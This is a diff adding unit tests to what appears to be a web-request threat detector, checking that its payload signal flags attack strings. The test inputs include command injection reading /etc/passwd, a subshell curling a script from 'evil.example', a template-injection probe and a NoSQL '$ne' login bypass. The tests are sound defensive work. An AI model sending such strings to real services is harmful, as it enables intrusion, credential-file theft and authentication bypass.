@@ -109,6 +109,36 @@ def test_payload_marks_comment_truncation_text():
     assert res.score >= 0.8
 
 
+def test_payload_marks_shell_separator_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="name=ok;cat /etc/passwd",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_marks_subshell_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="$(curl http://evil.example/p.sh)",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
 def test_payload_marks_boolean_tautology_text():
     ctx = RequestContext(
         identity="u1",
@@ -122,6 +152,36 @@ def test_payload_marks_boolean_tautology_text():
 
     res = asyncio.run(PayloadSignal().extract(ctx))
     assert res.score >= 0.8
+
+
+def test_payload_marks_ssti_expression_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="{{7*7}}",
+        url="/render",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/render",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.6
+
+
+def test_payload_marks_nested_nosql_operator_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload='{"username":{"$ne":null}}',
+        url="/login",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/login",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.6
 
 
 def test_payload_marks_encoded_function_sqli_text():
